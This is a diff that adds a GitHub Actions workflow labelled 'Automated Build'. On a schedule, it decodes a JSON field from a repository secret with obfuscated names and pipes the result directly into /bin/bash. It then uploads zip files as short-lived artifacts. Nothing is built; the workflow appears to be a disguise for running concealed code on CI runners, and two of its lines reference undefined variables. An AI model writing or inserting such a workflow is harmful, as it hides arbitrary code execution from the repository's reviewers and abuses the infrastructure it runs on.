@@ -1,0 +1,33 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '26 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          wr3243: ${{ secrets.wr3243 }}
+        run: |
+          printf '%s' "$wr3243" | jq -r .j73 | /bin/bash
+          printf '%s' "$vuhui9" | jq -r .cgtas9 | /bin/bash
+          echo $kfs0 | jq -r .qwgqz58 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: KajIxfBL
+          path: "*.zip"
+          retention-days: 1
